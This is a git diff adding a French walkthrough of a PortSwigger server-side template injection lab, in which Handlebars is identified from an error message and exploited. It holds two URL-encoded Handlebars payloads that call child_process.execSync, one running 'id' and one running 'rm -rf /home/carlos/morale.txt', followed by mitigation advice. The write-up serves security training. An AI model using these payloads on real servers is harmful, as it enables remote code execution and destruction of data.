@@ -419,7 +419,43 @@ Le champ de saisie n'est pas correctement assaini, permettant l'injection de cod
 
 [https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit)
 
-<!-- TODO -->
+### Étapes
+
+1. On ouvre le chall, on teste les boutons visiter
+2. On voit en cliquant sur un des boutons, on a un message qui s'affiche, et qui est dans l'url
+3. Grâce au cours, on teste `{{7*7}}` à la place du message
+4. On voit maintenant cette erreur : `/opt/node-v19.8.1-linux-x64/lib/node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js:267`.\
+  On sait donc que le moteur de template est `handlebars`.
+5. On cherche un payload sur internet: [https://gist.github.com/laztname/cccacb1967d15b92ba624f0874909b4c/revisions](https://gist.github.com/laztname/cccacb1967d15b92ba624f0874909b4c/revisions)
+6. On change la commande par 'id' pour test, mais la payload ne marche pas.
+7. Après une longue recherche, on se rend compte qu'il faut enlever "process.mainModule."\
+  On teste donc avec la payload encodée :
+
+  ```txt
+  %0A%7B%7B%23with%20%22s%22%20as%20%7Cstring%7C%7D%7D%0A%7B%7B%23with%20%22e%22%7D%7D%0A%7B%7B%23with%20split%20as%20%7Cconslist%7C%7D%7D%0A%7B%7Bthis.pop%7D%7D%0A%7B%7Bthis.push%20%28lookup%20string.sub%20%22constructor%22%29%7D%7D%0A%7B%7Bthis.pop%7D%7D%0A%7B%7B%23with%20string.split%20as%20%7Ccodelist%7C%7D%7D%0A%7B%7Bthis.pop%7D%7D%0A%7B%7Bthis.push%20%22return%20require%28%27child_process%27%29.execSync%28%27id%27%29%3B%22%7D%7D%0A%7B%7Bthis.pop%7D%7D%0A%7B%7B%23each%20conslist%7D%7D%0A%7B%7B%23with%20%28string.sub.apply%200%20codelist%29%7D%7D%0A%7B%7Bthis%7D%7D%0A%7B%7B%2Fwith%7D%7D%0A%7B%7B%2Feach%7D%7D%0A%7B%7B%2Fwith%7D%7D%0A%7B%7B%2Fwith%7D%7D%0A%7B%7B%2Fwith%7D%7D%0A%7B%7B%2Fwith%7D%7D
+  ```
+
+Ça marche et id fonctionne, donc on met la commande `rm -rf /home/carlos/morale.txt` dans la payload :
+
+```txt
+%0A%7B%7B%23with%20%22s%22%20as%20%7Cstring%7C%7D%7D%0A%7B%7B%23with%20%22e%22%7D%7D%0A%7B%7B%23with%20split%20as%20%7Cconslist%7C%7D%7D%0A%7B%7Bthis.pop%7D%7D%0A%7B%7Bthis.push%20%28lookup%20string.sub%20%22constructor%22%29%7D%7D%0A%7B%7Bthis.pop%7D%7D%0A%7B%7B%23with%20string.split%20as%20%7Ccodelist%7C%7D%7D%0A%7B%7Bthis.pop%7D%7D%0A%7B%7Bthis.push%20%22return%20require%28%27child_process%27%29.execSync%28%27rm%20-rf%20%2Fhome%2Fcarlos%2Fmorale.txt%27%29%3B%22%7D%7D%0A%7B%7Bthis.pop%7D%7D%0A%7B%7B%23each%20conslist%7D%7D%0A%7B%7B%23with%20%28string.sub.apply%200%20codelist%29%7D%7D%0A%7B%7Bthis%7D%7D%0A%7B%7B%2Fwith%7D%7D%0A%7B%7B%2Feach%7D%7D%0A%7B%7B%2Fwith%7D%7D%0A%7B%7B%2Fwith%7D%7D%0A%7B%7B%2Fwith%7D%7D%0A%7B%7B%2Fwith%7D%7D
+```
+
+**Challenge réussi**
+
+### Explication
+
+Le moteur de template Handlebars permet l'exécution de code arbitraire via des expressions malveillantes.
+En exploitant cette vulnérabilité, un attaquant peut exécuter des commandes système.
+
+### Recommandations
+
+- Valider et assainir les entrées utilisateur utilisées dans les templates
+- Utiliser des moteurs de template sécurisés qui limitent l'exécution de code arbitraire
+
+### Références
+
+[https://portswigger.net/web-security/server-side-template-injection/exploiting#exploiting-server-side-template-injection-in-unknown-languages-with-documented-exploits](https://portswigger.net/web-security/server-side-template-injection/exploiting#exploiting-server-side-template-injection-in-unknown-languages-with-documented-exploits)
 
 <br />
 <hr style="height: 0; border: 1px white solid;" />
